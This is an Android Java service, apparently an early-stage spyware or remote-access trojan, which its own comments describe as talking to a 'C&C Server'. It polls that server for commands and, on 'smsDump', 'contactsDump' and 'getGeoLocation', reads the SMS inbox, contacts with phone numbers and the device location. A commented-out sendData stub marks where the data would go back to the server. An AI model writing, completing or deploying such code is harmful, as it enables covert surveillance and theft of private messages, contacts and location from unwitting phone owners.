package com.app.checker;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.ResourceBundle;
import java.util.TimeZone;
import java.util.UUID;

public class Fetcher extends Service {

    final String SERVER_IP = "127.0.0.1"; // C&C Server
    final int SERVER_PORT = 80;
    final String FILE_NAME = "data";
    final String FULL_URL = "http://" + SERVER_IP + ":" + SERVER_PORT + "/" + FILE_NAME;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Check or store UUID to uniquely identify the device
        SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        final String id = sPrefs.getString("uuid", null);
        if (id == null) {
            SharedPreferences.Editor editor = sPrefs.edit();
            UUID uuid = java.util.UUID.randomUUID();
            editor.putString("uuid", uuid.toString());
            editor.commit(); // Store UUID permanently in the device
        }

        try {
            if (isConnected()) { // Check if device has a network connection
                new JsonTask().execute(FULL_URL + "?id=" + id);
            } else {
                Toast.makeText(getApplicationContext(), "No network connection", Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Service.START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // HTTP Request for JSON objects
    private class JsonTask extends AsyncTask<String, String, String> {
        protected void onPreExecute() {
            super.onPreExecute();
        }

        private static final String REQUEST_METHOD = "GET";
        private static final int READ_TIMEOUT = 15000;
        private static final int CONNECTION_TIMEOUT = 15000;

        @Override
        protected String doInBackground(String... params) {
            HttpURLConnection conn = null;
            BufferedReader buff = null;
            try {
                URL url = new URL(params[0]);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(REQUEST_METHOD);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setConnectTimeout(CONNECTION_TIMEOUT);
                conn.connect();

                InputStream stream = conn.getInputStream();

                buff = new BufferedReader(new InputStreamReader(stream));
                StringBuffer buffer = new StringBuffer();

                String line;
                while ((line = buff.readLine()) != null) {
                    buffer.append(line);
                }
                return buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
                try {
                    if (buff != null) {
                        buff.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        // After fetching JSON response
        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);

            if (result != null) { // Check if the server is reachable
                try {
                    JSONObject json = new JSONObject(result);
                    String task = json.getString("task");
                    String machineID = json.getString("uuid");
                    SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                    final String id = sPrefs.getString("uuid", null);
                    //if(machineID.equals(id)){
                    if (task.equals("kill")) {
                        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
                        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
                        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
                        if (alarmManager != null) {
                            alarmManager.cancel(pintent);
                        }
                        stopSelf();
                    } else if (task.equals("smsDump")) {
                        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                            ArrayList<String> sms = fetchInbox();
                            Toast.makeText(getApplicationContext(), String.valueOf(sms.size()), Toast.LENGTH_SHORT).show();
                            for (int i = 0; i < sms.size(); i++) {
                                Toast.makeText(getApplicationContext(), sms.get(i), Toast.LENGTH_LONG).show();
                            }
                            //sendData();
                        }
                    } else if (task.equals("getGeoLocation")) {
                        getLastLocation();
                    } else if (task.equals("contactsDump")) {
                        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
                            ArrayList<String> contactInfo = fetchContacts();
                            Toast.makeText(getApplicationContext(), String.valueOf(contactInfo.size()), Toast.LENGTH_SHORT).show();
                            for (int i = 0; i < contactInfo.size(); i++) {
                                Toast.makeText(getApplicationContext(), contactInfo.get(i), Toast.LENGTH_LONG).show();
                            }
                        }
                    }
                    //} else {
                    //Toast.makeText(getApplicationContext(),"Machine UUID not matching with JSON UUID",Toast.LENGTH_LONG).show();
                    //}

                } catch (JSONException e) {
                    Log.e("Error", e.getMessage());
                }
            } else {
                Toast.makeText(getApplicationContext(), "Server not reachable", Toast.LENGTH_LONG).show();
            }
        }


    }

    public boolean isConnected() {
        ConnectivityManager connMan = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);

        if (connMan != null) {
            NetworkInfo netInfo = connMan.getActiveNetworkInfo();

            if (netInfo != null && netInfo.isConnected()) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    // Method to dump SMS messages
    public ArrayList<String> fetchInbox() {
        ArrayList<String> sms = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
        if (cursor != null) {
            cursor.moveToFirst();
            for (int i = 0; i < cursor.getCount(); i++) {
                String id = cursor.getString(0);
                String address = cursor.getString(1);
                Long dateMil = cursor.getLong(2);
                String body = cursor.getString(3);
                Date date = new Date(dateMil);
                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
                String formatted = formatter.format(date);
                sms.add("ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body);
                cursor.moveToNext();
            }
        }
        return sms;
    }

    private ArrayList<String> fetchContacts() {
        ArrayList<String> info = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if ((cursor != null ? cursor.getCount() : 0) > 0) {
            while (cursor != null && cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex((ContactsContract.Contacts.DISPLAY_NAME)));

                if (cursor.getInt(cursor.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null
                    );
                    while (pCur.moveToNext()) {
                        String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        info.add("ID=>" + id + "\nName=>" + name + "\nPhone Number" + phoneNumber);
                    }

                }
            }
//            cursor.moveToFirst();
//            for (int i=0;i<cursor.getCount();i++){
//                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
//                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
//                if(cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))>0){
//                    Cursor numberCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
//                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id},null);
//                    String phoneNumber = numberCursor.getString(numberCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//                    info.add("ID=>"+id+"\nName=>"+name+"\nPhone Number"+phoneNumber);
//                }
//            }
        }
        if (cursor != null)
            cursor.close();
        return info;
    }

    // Method to retrieve geographical location
    private void getLastLocation() {
        FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        try {
            mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
                @Override
                public void onSuccess(Location location) {
                    if (location != null) {
                        double latitude = location.getLatitude();
                        double longitude = location.getLongitude();
                        Toast.makeText(getApplicationContext(), String.valueOf(latitude) + "/" + String.valueOf(longitude), Toast.LENGTH_LONG).show();
                    } else {
                        Toast.makeText(getApplicationContext(), "Cannot get location", Toast.LENGTH_LONG).show();
                    }
                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("LocationFetch", "Error trying to get last GPS location");
                            e.printStackTrace();
                        }
                    });
        } catch (SecurityException e) {
            Log.d("LocationFetch", "Permission missing");
        }
    }

    // Send data to C&C
//    private void sendData() throws IOException {
//        URL url = new URL(FULL_URL);
//        HttpURLConnection httpCon = (HttpURLConnection)url.openConnection();
//        httpCon.setDoOutput(true);
//        httpCon.setRequestMethod("PUT");
//        OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
//        httpCon.getInputStream();
//    }
}